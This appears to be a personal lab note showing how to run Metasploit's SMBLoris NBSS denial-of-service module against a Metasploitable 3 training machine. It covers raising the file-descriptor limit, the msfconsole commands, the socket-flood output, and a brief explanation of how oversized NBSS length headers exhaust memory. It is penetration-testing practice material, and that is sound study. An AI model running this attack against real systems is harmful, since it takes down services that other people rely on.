## Introduction
[[DOS]]
## SMBLoris NBSS Denial of Service auxiliary DoS module

#### We need to use the `ulimit` command to set the maximum number of [[open file descriptors]] to 65535, so we can handle simultaneous connections.
```python
┌──(hyok㉿kali)-[/opt/lampp/htdocs/ATutor]
└─$ ulimit -n 65535
┌──(hyok㉿kali)-[/opt/lampp/htdocs/ATutor]
└─$ ulimit -n           
65535
```

#### Now that we have set the maximum number of simultaneous connections to 65535, we can use the SMBLoris NBSS Denial of Service auxiliary DoS module to attack our target, by simply setting the IP address of the Metasploitable 3 machine and typing run to run the module:
```python
┌──(hyok㉿kali)-[/opt/lampp/htdocs/ATutor]
└─$ msfconsole -q
msf6 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/dos/smb/smb_loris
msf6 auxiliary(dos/smb/smb_loris) > set RHOST 192.168.216.11
RHOST => 192.168.216.11
msf6 auxiliary(dos/smb/smb_loris) > run

[*] Starting server...
[*] 192.168.216.11:445 - 100 socket(s) open
[*] 192.168.216.11:445 - 200 socket(s) open
[*] 192.168.216.11:445 - 300 socket(s) open
[*] 192.168.216.11:445 - 400 socket(s) open
[*] 192.168.216.11:445 - 500 socket(s) open
[*] 192.168.216.11:445 - 600 socket(s) open
[*] 192.168.216.11:445 - 700 socket(s) open
[*] 192.168.216.11:445 - 800 socket(s) open
[*] 192.168.216.11:445 - 900 socket(s) open
[*] 192.168.216.11:445 - 1000 socket(s) open
[!] 192.168.216.11:445 - At open socket limit with 1019 sockets open. Try increasing your system limits.
[*] 192.168.216.11:445 - 1019 socket(s) open
[*] 192.168.216.11:445 - Holding steady at 1019 socket(s) open
[*] 192.168.216.11:445 - Holding steady at 1019 socket(s) open
[*] 192.168.216.11:445 - Holding steady at 1019 socket(s) open
[*] 192.168.216.11:445 - Holding steady at 1019 socket(s) open
[*] 192.168.216.11:445 - Holding steady at 1019 socket(s) open
[*] 192.168.216.11:445 - Holding steady at 1019 socket(s) open
[*] 192.168.216.11:445 - Holding steady at 1019 socket(s) open
[*] 192.168.216.11:445 - Holding steady at 1019 socket(s) open
^[[1;2A^C^C[-] Stopping running against current target...
[*] Control-C again to force quit all targets.
^C[-] Auxiliary interrupted by the console user
[*] Auxiliary module execution completed
   ```

- Looking at the target machine, we can see the attack consumes large chunks of memory in the target by sending SMB requests with the NetBIOS Session Service (NBSS) length header value set to the maximum possible value, which initiates a large numbers of sessions, and the memory does not get freed, halting the target machine:

Note - `msfconsole` with the `-q` option, so it does not print the banner on startup.